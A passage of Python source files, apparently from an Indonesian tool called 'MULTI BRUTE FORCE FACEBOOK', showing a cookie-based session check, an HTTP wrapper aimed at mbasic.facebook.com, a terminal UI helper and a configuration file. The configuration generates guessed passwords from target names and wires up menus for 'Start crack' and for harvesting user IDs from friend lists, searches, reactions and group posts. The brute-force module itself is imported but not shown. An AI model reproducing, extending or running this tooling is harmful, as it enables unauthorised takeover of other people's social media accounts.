    except:
        return []

def isActive(self):
    cookies = readCookies()
    progressBar(text='Mengecek cookies...', max=25)
    self.store.http.setCookies(cookies)
    id = re.findall(r'c_user=(\d+);', cookies)[0]
    try:
        response = self.store.http.get('/profile').text()
        name = self.store.http.currentTitle()
    except:
        br(1)
        prints('!m!Tidak ada koneksi mohon cek koneksi internet Anda.!r!', blank_left=4)
        exit()
    if 'mbasic_logout_button' in str(response):
        banner()
        if 'Laporkan Masalah' not in str(response):
            try:
                http = self.store.http.get('/language.php')
                for i in http.bs4().find_all('a'):
                    if 'Bahasa Indonesia' in str(i):
                        http.get(i['href'])
            except: pass
        self.store.setCredentials({
            'id': id,
            'name': name
        })
        return True
    else:
        try:
            os.remove('.login.json')
            os.remove('session/%s.json'%(id))
        except:
            pass
        return False

def isLogin():
    cookies = readCookies()
    if cookies == '':
        return False
    else:
        return True

def readCookies():
    try:
        read = open('.login.json', 'r', encoding='utf-8').read()
        load = json.loads(read)
        return load['credentials']['cookies']
    except:
        return ''
        
        #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : http.py                            #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import requests, json
from bs4 import BeautifulSoup as BS

class Http(requests.Session):

    ua = 'Chrome/46.0.2490.71'

    def __init__(self, store=None):
        super(Http, self).__init__()
        self.headers.update({'User-Agent': self.ua})
        self.store = store
        self.response = None

    def setCookies(self, data=None, dicts={}):
        if data == None:
            return False
        for x in data.replace(' ', '').strip().split(';'):
            kuki = x.split('=')
            if len(kuki) > 1:
                dicts.update({kuki[0]: kuki[1]})
        if len(dicts) == 0:
            return False
        requests.utils.add_dict_to_cookiejar(self.cookies, dicts)
        return self

    def addHeaders(self, name='', value=''):
        self.headers.update({name: value})
        return self

    def updateHeaders(self):
        self.headers.update(self.currentHeaders())
        return self

    def updateCookies(self):
        requests.utils.add_dict_to_cookiejar(self.cookies, self.currentCookies())
        return self

    def deleteHeaders(self, key=''):
        try:
            del self.headers[key]
            return self
        except:
            return self

    def get(self, path='/', base_url=True, with_credentials=True, redirect=True, data={}):
        url = self.store.url(path) if base_url == True else path
        self.response = super(Http, self).get(url, params=data, allow_redirects=redirect) if with_credentials == True else requests.get(url, params=data, allow_redirects=redirect)
        return self

    def post(self, path='/', base_url=True, with_credentials=True, redirect=True, data={}):
        url = self.store.url(path) if base_url == True else path
        self.response = super(Http, self).post(url, data=data, allow_redirects=redirect) if with_credentials == True else requests.post(url, data=data, allow_redirects=redirect)
        return self

    def text(self):
        return self.response.text

    def json(self):
        return json.loads(self.text())

    def url(self):
        return self.response.url

    def statusCode(self):
        return self.response.status_code

    def bs4(self):
        return BS(self.text(), 'html.parser')

    def currentHeaders(self):
        return self.response.headers

    def currentCookies(self, dict=True):
        return self.response.cookies.get_dict() if dict == True else self.response.cookies

    def currentTitle(self):
        try:
            return self.bs4().title.text
        except:
            return ''

    def currentInputHidden(self, key=None):
        data = {}
        for e in self.bs4().find_all('form'):
            for x in e.find_all('input', {'type': 'hidden', 'name': True, 'value': True}):
                data.update({x['name']: x['value']})
        try:
            return data[key] if key != None else data
        except:
            return data
    
    def currentActionForm(self, like=''):
        for e in self.bs4().find_all('form'):
            try:
                if like in str(e['action']):
                    return e['action']
            except:
                return '/'
                
                #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : CLI.py                             #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import platform, os, random, time

__BANNER__ = '''
  !b! ___ ___  ____   _____ 
  !b!|   T   T|    \ |     | !m!(!p!MULTI BRUTE FORCE FACEBOOK!m!)
  !b!| _   _ ||  o  )|   __j !m!-------------------------------
  !b!|  \_/  ||     T|  l_   !h!Dev      !m!: !p!DulLah
  !b!|   |   ||  O  ||   _]  !h!FB       !m!: !p!https//fb.me/dulahz
  !b!|   |   ||     ||  T    !h!Github   !m!: !p!https://github.com/dz-id
  !b!l___j___jl_____jl__j    !h!Version  !m!: !p!3.0
'''

osname = platform.system().lower()

list = {}

if osname[:3].lower() == 'lin':
    list['!m!'] = '\033[1;91m'
    list['!h!'] = '\033[1;92m'
    list['!k!'] = '\033[1;93m'
    list['!p!'] = '\033[1;97m'
    list['!c!'] = '\033[1;96m'
    list['!u!'] = '\033[1;95m'
    list['!b!'] = '\033[1;94m'
    list['!t!'] = '\033[1;90m'
    list['!r!'] = '\033[0m'
else:
    list['!m!'] = ''
    list['!h!'] = ''
    list['!k!'] = ''
    list['!p!'] = ''
    list['!c!'] = ''
    list['!u!'] = ''
    list['!b!'] = ''
    list['!t!'] = ''
    list['!r!'] = ''

def banner():
    clear()
    prints(__BANNER__, blank_left=2)

def clear():
    os.system('clear' if osname[:3].lower() == 'lin' else 'cls')

def br(num=0):
    if num == 0:
        return False
    if type(num).__name__ == 'int':
        return print('\n' *int((num-1)))
    return False

def progressBar(text='', max=10):
    count = 0
    message = '\r{0:>4}!m![!ran!{1:'+str(int(max)-1)+'s}!m!] !p!{2} {3:.0f}% '
    for i in range(max):
        count+=1
        write(message.format((''), ('=' *i), (text), (count * 100 / max)))
        time.sleep(0.1)
    write('\r')
    br(2)

def color(string=''):
    randomList = [
        '!m!', '!h!',
        '!k!', '!p!',
        '!c!', '!u!',
        '!b!', '!t!'
    ]

    for key in list:
        string = string.replace(key, list[key])

    randoms = random.choice(randomList)

    string = string.replace('!ran!', list[randoms])

    return(list['!r!']+string)

def inputs(string='', blank_left=None, blank_right=None):
    if type(string).__name__ in ['dict', 'list']:
        return input(string)

    string = color(string)

    if blank_right != None and type(blank_right).__name__ == 'int':
        string = (string+(' ' * blank_right))
    if blank_left != None and type(blank_left).__name__ == 'int':
        string = ((' ' * blank_left)+string)

    return input(string)

def prints(string='', with_flush=False, blank_left=None, blank_right=None):
    if type(string).__name__ in ['dict', 'list']:
        return print(string)

    string = color(string)

    if blank_right != None and type(blank_right).__name__ == 'int':
        string = (string+(' ' * blank_right))
    if blank_left != None and type(blank_left).__name__ == 'int':
        string = ((' ' * blank_left)+string)
    if with_flush == True:
        return print(end=f'\r{string}', flush=with_flush)

    return print(string)

def write(string='', blank_left=None, blank_right=None):
    if type(string).__name__ in ['dict', 'list']:
        os.sys.stdout.write(string)
        return os.sys.stdout.flush()

    string = color(string)

    if blank_right != None and type(blank_right).__name__ == 'int':
        string = (string+(' ' * blank_right))
    if blank_left != None and type(blank_left).__name__ == 'int':
        string = ((' ' * blank_left)+string)

    os.sys.stdout.write(string)
    os.sys.stdout.flush()
    
    #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : app.py                             #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

from src.store import Store
from src.MBF import MBF
from src.http import Http
from src.data.login import Login
from src.data.dump import Dump
from src.data.brute import Brute

store = Store()

#######################################################
#                   C O N F I G                       #
#######################################################
# akan menghasilkan pw: nama_depan123, nama_belakang12345
# nama_tengah123, nama_tengah12345
# dan seterusnya
store.passwordNameList = ['123', '12345']
# contoh penggunaan store.passwordExtraList = ['sayang', 'doraemon', 'dll']
# catatan: semakin banyak password semakin lama proses crakingnya.
store.passwordExtraList = []
# lower password
store.passwordLower = True
# base url
store.setBaseURL('https://mbasic.facebook.com{0}')
# login class
store.setLoginClass(Login)
# http requests classs
store.setHttpClass(Http)

dump = Dump(store)
mbf = MBF(store)
brute = Brute(store)

store.add({
    'name': 'Start crack',
    'func': brute.main,
})
store.add({
    'name': 'Dump id dari daftar teman',
    'func': dump.friendsList,
})
store.add({
    'name': 'Dump id publik',
    'func': dump.publicID,
})
store.add({
    'name': 'Dump id dari pencarian nama',
    'func': dump.search,
})
store.add({
    'name': 'Dump id dari reaction post',
    'func': dump.react,
})
store.add({
    'name': 'Dump id dari postingan group',
    'func': dump.postGroup,
})
store.add({
    'name': 'Hapus cache hasil dump',
    'func': mbf.clearDumpCache,
})
store.add({
    'name': 'Lihat hasil crack',
    'func': mbf.resultCrack,
})
store.add({
    'name': 'Ganti akun',
    'func': mbf.changeAccount,
})

mbf.run()